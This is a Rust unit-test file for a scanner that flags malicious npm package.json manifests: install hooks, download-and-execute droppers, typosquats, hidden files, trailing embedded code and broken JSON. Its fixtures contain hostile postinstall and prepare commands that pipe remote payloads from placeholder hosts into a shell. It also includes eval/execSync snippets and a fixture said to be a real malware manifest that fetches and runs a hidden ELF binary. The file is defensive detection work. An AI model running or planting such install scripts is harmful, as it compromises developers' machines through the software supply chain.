use super::*;

#[test]
fn test_basic_package_json() {
    let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "lodash": "^4.17.21"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert_eq!(report.target.file_type, "package.json");
    assert!(!report.imports.is_empty());
}

#[test]
fn test_suspicious_install_hook() {
    let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl http://evil.com/payload | sh"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    // Should detect the install hook. (Per-script capability findings such
    // as the network operation now come from YAML capability traits, which
    // this engine-only unit test does not load.)
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id.contains("install-hook"))
    );
}

#[test]
fn local_php_scripts_do_not_claim_command_and_control() {
    let content = r#"{"name":"formatter","version":"1.0.0","scripts":{
            "check":"php vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php",
            "test":"php -f test.php"
        }}"#;
    let report = PackageJsonAnalyzer::new()
        .analyze_package(Path::new("package.json"), content)
        .unwrap();
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "command-and-control/endpoint/php")
    );
    assert!(
        !report
            .strings
            .iter()
            .any(|s| s.string_type == Some(StringType::Url))
    );
}

#[test]
fn php_script_urls_remain_visible_without_c2_claims() {
    let content = r#"{"name":"api-client","version":"1.0.0","scripts":{
            "fetch":"curl https://example.test/api.php?format=json"
        }}"#;
    let report = PackageJsonAnalyzer::new()
        .analyze_package(Path::new("package.json"), content)
        .unwrap();
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "command-and-control/endpoint/php")
    );
    assert!(report.strings.iter().any(|s| {
        s.string_type == Some(StringType::Url)
            && s.value.as_str() == "https://example.test/api.php?format=json"
    }));
}

#[test]
fn lifecycle_findings_do_not_claim_a_script_ran() {
    let content = r#"{"name":"sample","version":"1.0.0","scripts":{"prepare":"husky install","postuninstall":"cleanup"}}"#;
    let report = PackageJsonAnalyzer::new()
        .analyze_package(Path::new("package.json"), content)
        .unwrap();
    for hook in ["prepare", "postuninstall"] {
        let id = format!("supply-chain/install-hook/{hook}");
        let finding = report.findings.iter().find(|f| f.id == id).unwrap();
        assert_eq!(
            finding.desc,
            format!("Package declares '{hook}' lifecycle script")
        );
    }
}

#[test]
fn test_hidden_file_in_docs_script_is_not_evasion() {
    let content = r#"{
            "name": "nan",
            "version": "2.16.0",
            "scripts": {
                "docs": "doc/.build.sh"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file")
    );
}

/// Where a manifest sits says nothing about what it does: an attacker
/// controls the path, so a `fixtures/` or `testdata/` directory must not
/// excuse a dropper.
#[test]
fn test_fixture_path_does_not_excuse_droppers() {
    let content = r#"{
            "name": "vulnerable-project",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "curl https://evil.example/payload.sh | bash",
                "prepare": "wget -O- https://evil.example/init | sh && node setup.js"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(
            Path::new("examples/vulnerable-configs/supply-chain/package.json"),
            content,
        )
        .unwrap();

    for id in [
        "command-and-control/dropper/download-execute",
        "command-and-control/dropper/pipe-execute",
    ] {
        assert!(report.findings.iter().any(|f| f.id == id), "missing {id}");
    }
}

#[test]
fn manual_pipe_does_not_mask_automatic_pipe() {
    let analyzer = PackageJsonAnalyzer::new();
    let manual = r#"{"name":"sample","version":"1.0.0","scripts":{
            "aaa":"curl https://example.test/installer | sh"
        }}"#;
    let mixed = r#"{"name":"sample","version":"1.0.0","scripts":{
            "aaa":"curl https://example.test/installer | sh",
            "preinstall":"curl https://example.test/payload | bash"
        }}"#;
    let find = |content| {
        let report = analyzer
            .analyze_package(Path::new("package.json"), content)
            .unwrap();
        report
            .findings
            .into_iter()
            .find(|f| f.id == "command-and-control/dropper/pipe-execute")
            .unwrap()
    };
    assert_eq!(find(manual).crit, Criticality::Suspicious);
    let automatic = find(mixed);
    assert_eq!(automatic.crit, Criticality::Hostile);
    assert!(automatic.desc.contains("preinstall"));
}

#[test]
fn test_hidden_file_in_install_hook_stays_suspicious() {
    let content = r#"{
            "name": "bad-package",
            "version": "1.0.0",
            "scripts": {
                "postinstall": "sh ./.hidden/dropper.sh"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file")
    );
}

#[test]
fn test_registry_dotfile_is_not_hidden_payload() {
    let content = r#"{
            "name": "temporary-config",
            "version": "1.0.0",
            "scripts": {"postinstall": "echo token > $d/.npmrc; rm -rf $d"}
        }"#;
    let report = PackageJsonAnalyzer::new()
        .analyze_package(Path::new("package.json"), content)
        .unwrap();
    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file")
    );
}

#[test]
fn test_opencode_command_install_is_not_hidden_file_evasion() {
    let content = r#"{
            "name": "md-annotator-opencode",
            "version": "0.11.1",
            "scripts": {
                "postinstall": "mkdir -p ${XDG_CONFIG_HOME:-$HOME/.config}/opencode/command && cp ./commands/*.md ${XDG_CONFIG_HOME:-$HOME/.config}/opencode/command/ 2>/dev/null || true"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file")
    );
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id.contains("install-hook") || f.id.contains("postinstall"))
    );
}

#[test]
fn test_opencode_command_install_does_not_hide_other_hidden_paths() {
    let content = r#"{
            "name": "md-annotator-opencode",
            "version": "0.11.1",
            "scripts": {
                "postinstall": "mkdir -p ${XDG_CONFIG_HOME:-$HOME/.config}/opencode/command && cp ./commands/*.md ${XDG_CONFIG_HOME:-$HOME/.config}/opencode/command/ && cp ./payload.sh ./.hidden/dropper.sh"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file")
    );
}

#[test]
fn test_husky_prepare_script_is_not_hidden_file_evasion() {
    let content = r#"{
            "name": "benign-package",
            "version": "1.0.0",
            "scripts": {
                "prepare": "cd .. && husky ui/.husky"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "evasion/hidden-file")
    );
}

#[test]
fn test_typosquat_detection() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(analyzer.check_typosquat("lodas").is_some());
    assert!(analyzer.check_typosquat("axio").is_some());
    assert!(analyzer.check_typosquat("reac").is_some());
    assert!(analyzer.check_typosquat("lodash").is_none()); // Legitimate
    assert!(analyzer.check_typosquat("lodash3").is_none());
}

#[test]
fn gaxios_does_not_hide_an_unrelated_typosquat() {
    let analyzer = PackageJsonAnalyzer::new();
    assert_eq!(analyzer.check_typosquat("gaxios"), None);
    assert_eq!(analyzer.check_typosquat("axois"), Some("axios"));
    for (dependencies, expected) in [
        (r#"{"gaxios":"^7.0.0"}"#, 0),
        (r#"{"gaxios":"^7.0.0","axois":"^1.0.0"}"#, 1),
    ] {
        let content = format!(
            r#"{{"name":"http-client-consumer","version":"1.0.0","dependencies":{dependencies}}}"#
        );
        let report = analyzer
            .analyze_package(Path::new("package.json"), &content)
            .unwrap();
        let findings: Vec<_> = report
            .findings
            .iter()
            .filter(|finding| finding.id == "supply-chain/typosquat")
            .collect();
        assert_eq!(findings.len(), expected);
        if expected == 1 {
            assert!(
                findings[0]
                    .evidence
                    .iter()
                    .any(|e| e.value == "axois -> axios")
            );
        }
    }
}

#[test]
fn test_npm_alias_to_typosquat_target_is_not_flagged() {
    let content = r#"{
            "name": "legacy-typescript-consumer",
            "version": "1.0.0",
            "devDependencies": {
                "typescript3": "npm:typescript@^3.1.6"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        !report
            .findings
            .iter()
            .any(|finding| finding.id == "supply-chain/typosquat")
    );
}

#[test]
fn test_scoped_devdependency_with_internal_webpack_substring_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("@soda/friendly-errors-webpack-plugin"));
}

#[test]
fn test_scoped_webpack_dependency_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("@vercel/webpack-nft"));
}

#[test]
fn test_webpack_hot_middleware_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("webpack-hot-middleware"));
}

#[test]
fn test_webpack_build_notifier_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("webpack-build-notifier"));
}

#[test]
fn test_scoped_legitimate_webpack_dependency_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("@scope/webpack-hot-middleware"));
}

#[test]
fn test_same_name_github_fork_is_not_suspicious_package() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(analyzer.is_same_name_github_fork(
        "webpack-hot-middleware",
        "github:lyswhut/webpack-hot-middleware#329c4375"
    ));
}

#[test]
fn test_types_devdependency_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("@types/color-convert"));
}

#[test]
fn axios_integration_names_do_not_imply_malicious_packages() {
    let analyzer = PackageJsonAnalyzer::new();
    for name in [
        "axios-cookiejar-support",
        "axios-http2-adapter",
        "axios-custom-integration",
        "@vendor/axios-cookiejar-support",
    ] {
        assert!(!analyzer.is_suspicious_package_name(name), "{name}");
        assert_eq!(analyzer.check_typosquat(name), None, "{name}");
    }
    // Removing the generic prefix must retain the actual abuse clues.
    assert!(analyzer.is_suspicious_package_name("axios-stealer"));
    assert!(analyzer.is_suspicious_package_name("axios-backdoor"));
    assert_eq!(analyzer.check_typosquat("axois"), Some("axios"));
}

#[test]
fn axios_integration_manifest_and_dependencies_have_no_suspicion_claim() {
    let content = r#"{
            "name": "axios-custom-integration",
            "version": "1.2.3",
            "dependencies": { "axios-cookiejar-support": "^5.0.5" }
        }"#;
    let report = PackageJsonAnalyzer::new()
        .analyze_package(Path::new("package.json"), content)
        .unwrap();
    for id in [
        "supply-chain/suspicious-name",
        "supply-chain/suspicious-package",
    ] {
        assert!(
            !report.findings.iter().any(|finding| finding.id == id),
            "{id}"
        );
    }
}

#[test]
fn test_axios_proxy_builder_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("axios-proxy-builder"));
}

#[test]
fn test_scoped_axios_proxy_builder_segment_is_not_suspicious() {
    let analyzer = PackageJsonAnalyzer::new();
    assert!(!analyzer.is_suspicious_package_name("@vendor/axios-proxy-builder"));
}

#[test]
fn test_git_dependency() {
    let content = r#"{
            "name": "test-package",
            "version": "1.0.0",
            "dependencies": {
                "malicious-lib": "git+https://github.com/attacker/repo.git"
            }
        }"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id.contains("git-dependency"))
    );
}

#[test]
fn test_edit_distance_one() {
    // Same string: distance 0, not 1
    assert!(!is_edit_distance_one(b"lodash", b"lodash"));
    // One deletion: distance 1
    assert!(is_edit_distance_one(b"lodash", b"lodas"));
    // One substitution: distance 1
    assert!(is_edit_distance_one(b"lodash", b"lodaxh"));
    // One insertion: distance 1
    assert!(is_edit_distance_one(b"lodash", b"lodassh"));
    // Distance > 1
    assert!(!is_edit_distance_one(b"lodash", b"lod"));
    // Empty vs single char
    assert!(is_edit_distance_one(b"", b"a"));
    assert!(!is_edit_distance_one(b"", b"ab"));
}

#[test]
fn test_trailing_content_invalid_json() {
    // Valid JSON followed by JavaScript code
    let content = r#"{"name": "evil-pkg", "version": "1.0.0"}
const x = require('child_process'); eval(x.execSync('id').toString());"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    // Should produce metadata/manifest/invalid-json (Notable)
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "metadata/manifest/invalid-json" && f.crit == Criticality::Notable),
        "Expected invalid-json finding, got: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );

    // Should produce embedded-code finding (Suspicious) since it looks like JS
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id.contains("embedded-code") && f.crit == Criticality::Suspicious),
        "Expected embedded-code finding"
    );
}

#[test]
fn test_trailing_content_variation_selectors() {
    // Valid JSON followed by content with variation selectors (U+FE01 = VS2)
    let content = format!(
        r#"{{"name": "stego-pkg", "version": "1.0.0"}}{}"#,
        "\u{FE01}\u{FE02}\u{FE03}"
    );

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), &content)
        .unwrap();

    // Should detect the variation selectors as steganographic obfuscation
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id.contains("steganography/unicode-variation-selectors")),
        "Expected variation selector finding, got: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
}

#[test]
fn test_trailing_whitespace_only_is_benign() {
    // Valid JSON followed by just whitespace — should NOT flag
    let content = r#"{"name": "ok-pkg", "version": "1.0.0"}
    "#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "metadata/manifest/invalid-json"),
        "Trailing whitespace should not trigger invalid-json finding"
    );
}

#[test]
fn test_no_trailing_content() {
    // Clean package.json — no trailing content findings
    let content = r#"{"name": "clean-pkg", "version": "1.0.0"}"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        !report.findings.iter().any(|f| f.id.contains("invalid-json")
            || f.id.contains("steganography")
            || f.id.contains("embedded-code")),
        "Clean package.json should have no trailing-content findings"
    );
}

#[test]
fn test_trailing_embedded_js_creates_file_layer() {
    // Trailing JS should produce an embedded FileAnalysis layer
    let content = r#"{"name": "evil", "version": "1.0.0"}
var http = require('http'); var cp = require('child_process'); eval(cp.execSync('whoami').toString());"#;

    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    // The embedded JS should be analyzed as a separate file layer
    assert!(
        !report.files.is_empty(),
        "Expected embedded file layer for trailing JS"
    );
    assert!(
        report.files[0].path.contains("##trailing@"),
        "Expected virtual path with ##trailing@ prefix, got: {}",
        report.files[0].path
    );
}

#[test]
fn test_parse_array_dependencies() {
    // Old npm packages (e.g. underscore 1.2.2) used arrays instead of objects
    // for dependencies and contributors. This must not cause a parse failure.
    let content = r#"{
            "name": "underscore",
            "description": "JavaScript's functional programming helper library.",
            "keywords": ["util", "functional", "server", "client", "browser"],
            "author": "Jeremy Ashkenas <jeremy@documentcloud.org>",
            "contributors": [],
            "dependencies": [],
            "repository": {"type": "git", "url": "git://github.com/documentcloud/underscore.git"},
            "main": "underscore.js",
            "version": "1.2.2"
        }"#;
    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();
    assert_eq!(report.target.file_type, "package.json");
    assert!(report.imports.is_empty());
}

// --- Fallback parser tests ---

#[test]
fn test_sanitize_json_strips_comments() {
    let input = r#"{
// this is a comment
"name": "test",
// another comment
"version": "1.0.0"
}"#;
    let sanitized = sanitize_json(input).expect("should detect comments");
    let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
    assert_eq!(pkg.name.as_deref(), Some("test"));
    assert_eq!(pkg.version.as_deref(), Some("1.0.0"));
}

#[test]
fn test_sanitize_json_strips_trailing_commas() {
    let input = r#"{"name": "test", "scripts": {},}"#;
    let sanitized = sanitize_json(input).expect("should detect trailing comma");
    let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
    assert_eq!(pkg.name.as_deref(), Some("test"));
}

#[test]
fn test_sanitize_json_returns_none_for_clean_json() {
    let input = r#"{"name": "clean", "version": "1.0.0"}"#;
    assert!(sanitize_json(input).is_none());
}

#[test]
fn test_sanitize_json_preserves_urls_with_slashes() {
    let input = r#"{"name": "test", "scripts": {"go": "curl https://example.com/path"},}"#;
    let sanitized = sanitize_json(input).expect("trailing comma");
    let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
    assert_eq!(
        pkg.scripts.get("go").unwrap(),
        "curl https://example.com/path"
    );
}

#[test]
fn test_sanitize_json_preserves_double_slash_inside_strings() {
    let input = r#"{"name": "test", "scripts": {"build": "echo // not a comment"},}"#;
    let sanitized = sanitize_json(input).expect("trailing comma");
    let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
    assert_eq!(pkg.scripts.get("build").unwrap(), "echo // not a comment");
}

#[test]
fn test_fallback_regex_extracts_scripts() {
    // Real-world malware with broken JSON structure
    let content = r#"{
    "name": "legacy react-aws-s3-typescript",
    "version": "1.2.4",
    "scripts": "test": "echo \"No test\"",
    "postinstall": "wget https://evil.com/payload && chmod +x payload && ./payload &""repository": {
        "type": "git",
    }
}"#;
    let pkg = extract_package_fallback(content).expect("should extract fields");
    assert_eq!(pkg.name.as_deref(), Some("legacy react-aws-s3-typescript"));
    assert_eq!(pkg.version.as_deref(), Some("1.2.4"));
}

#[test]
fn test_fallback_regex_returns_none_for_garbage() {
    assert!(extract_package_fallback("this is not json at all").is_none());
}

#[test]
fn test_analyze_trailing_comma_json() {
    // Trailing comma — should succeed via sanitize stage
    let content = r#"{
  "scripts": {},
}"#;
    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "metadata/manifest/malformed-json"),
        "Expected malformed-json finding, got: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );
    // Should still produce valid structure
    assert!(
        report
            .structure
            .iter()
            .any(|s| s.id == "manifest/npm/package.json")
    );
}

#[test]
fn test_analyze_json_with_comments() {
    // Angular-style docregion comments — should succeed via sanitize stage
    let content = r#"// #docplaster
// #docregion collection
{
  "name": "my-lib",
  "version": "0.0.1",
// #enddocregion collection
  "scripts": {
    "build": "tsc -p tsconfig.json"
  },
  "dependencies": {
    "@angular/core": "^21.0.0"
  }
// #docregion collection
}"#;
    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    // Should parse successfully with malformed-json finding
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "metadata/manifest/malformed-json"),
        "Expected malformed-json finding"
    );
    // Should have extracted the dependency
    assert!(
        report.imports.iter().any(|i| i.symbol == "@angular/core"),
        "Expected @angular/core import, got: {:?}",
        report.imports
    );
}

#[test]
fn test_analyze_mangled_malware_json() {
    // Real malware pattern: broken JSON with malicious postinstall
    let content = r#"{
    "name": "legacy react-aws-s3-typescript",
    "version": "1.2.4",
    "scripts": "test": "echo \"No specified test yet\"",
    "build": "tsc",
    "postinstall": "wget https://wirelite.app/updates/stageLESS.elf && mv stageLESS.elf .bash.elf && chmod +x .bash.elf && ./.bash.elf &""repository": {
        "type": "git",
    },
    "url": "git+https://github.com/NimperX/react-aws-s3-typescript.git""keywords": [
        "react",
    ]
}"#;
    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    // Must produce a malformed-json finding
    assert!(
        report
            .findings
            .iter()
            .any(|f| f.id == "metadata/manifest/malformed-json"),
        "Expected malformed-json finding, got: {:?}",
        report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
    );

    // Must extract the package name via fallback
    assert!(
        report
            .structure
            .iter()
            .any(|s| s.desc.contains("legacy react-aws-s3-typescript")),
        "Expected package name in structure, got: {:?}",
        report.structure.iter().map(|s| &s.desc).collect::<Vec<_>>()
    );
}

#[test]
fn test_analyze_hopeless_json_fails() {
    // Completely unparseable — no useful fields at all
    let content = r#"{ "non-parsable package.json""#;
    let analyzer = PackageJsonAnalyzer::new();
    let result = analyzer.analyze_package(Path::new("package.json"), content);
    assert!(
        result.is_err(),
        "Hopeless JSON should still return an error"
    );
}

#[test]
fn test_valid_json_has_no_malformed_finding() {
    let content = r#"{"name": "clean-pkg", "version": "1.0.0"}"#;
    let analyzer = PackageJsonAnalyzer::new();
    let report = analyzer
        .analyze_package(Path::new("package.json"), content)
        .unwrap();

    assert!(
        !report
            .findings
            .iter()
            .any(|f| f.id == "metadata/manifest/malformed-json"),
        "Valid JSON should not trigger malformed-json finding"
    );
}
